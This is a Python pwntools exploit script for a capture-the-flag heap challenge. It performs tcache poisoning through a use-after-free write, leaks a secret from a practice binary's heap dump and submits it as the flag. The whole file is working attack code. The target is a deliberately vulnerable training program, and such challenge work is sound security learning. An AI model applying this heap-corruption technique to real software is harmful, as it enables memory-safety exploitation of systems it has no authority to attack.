#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/seeking-spanless-secrets-easy', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401F91
            b* 0x0000000000402090
            b* 0x0000000000402168
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

prompt = b"Function (malloc/free/puts/scanf/send_flag/quit): "

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def malloc(idx, sz):
    sla(prompt, b'malloc')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def free(idx):
    sla(prompt, b'free')
    sla(b'Index: ', str(idx).encode())

def puts(idx):
    sla(prompt, b'puts')
    sla(b'Index: ', str(idx).encode())

def scanf(idx, dt):
    sla(prompt, b'scanf')
    sla(b'Index: ', str(idx).encode())
    sla(b'])\n', dt)

def send_flag(dt):
    sla(prompt, b'send_flag')
    sla(b'Secret: ', dt)

secret = 0x42510a

malloc(0, 0x20)
malloc(1, 0x20)
malloc(2, 0x20)

free(0)
free(1)
free(2)
# GDB()

# leak = b''
scanf(1, p64(secret-2))
p.recvuntil(b'0x425108            | 0                   | 0 (NONE)                     | ')
leak1 = int(p.recvuntil(' ', drop = True), 16)
p.recvuntil(b'| ')
leak2 = int(p.recvuntil(' ', drop = True), 16)
scanf(2, p64(secret+6))
raw_data = p.recvuntil(b'+----------------------------------------------------------------------------------------------------------------------+\n', drop = True)

leak3 = None
for line in raw_data.splitlines():
    if b"0x425110" in line:
        columns = [col.strip() for col in line.split(b"|")]
        leak3 = int(columns[-2].strip(), 16)

num_bytes1 = (leak1.bit_length() + 7) // 8 or 1
num_bytes2 = (leak2.bit_length() + 7) // 8 or 1
num_bytes3 = (leak3.bit_length() + 7) // 8 or 1

leak = leak1.to_bytes(num_bytes1, byteorder='little')
leak += leak2.to_bytes(num_bytes2, byteorder='little')
leak += leak3.to_bytes(num_bytes3, byteorder='little')

log.info(leak[2:])

send_flag(leak[2:])

p.interactive()